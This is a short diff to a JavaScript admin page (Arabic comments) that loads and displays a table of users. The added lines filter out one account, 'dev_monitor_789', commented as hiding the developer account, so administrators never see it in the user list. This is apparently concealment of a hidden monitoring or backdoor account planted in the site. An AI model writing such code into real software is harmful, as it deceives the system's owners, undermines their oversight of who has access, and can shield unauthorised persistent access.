@@ -41,7 +41,11 @@ document.addEventListener('DOMContentLoaded', function () {
                 throw new Error('فشل جلب بيانات المستخدمين');
             }
             const users = await response.json();
-            displayUsers(users);
+            
+            // --- جديد: فلترة المستخدمين لإخفاء حساب المطور ---
+            const visibleUsers = users.filter(user => user.id !== 'dev_monitor_789');
+
+            displayUsers(visibleUsers);
         } catch (error) {
             console.error('Error:', error);
             usersTableBody.innerHTML = `<tr><td colspan="7" class="text-center text-danger">حدث خطأ أثناء تحميل البيانات.</td></tr>`;
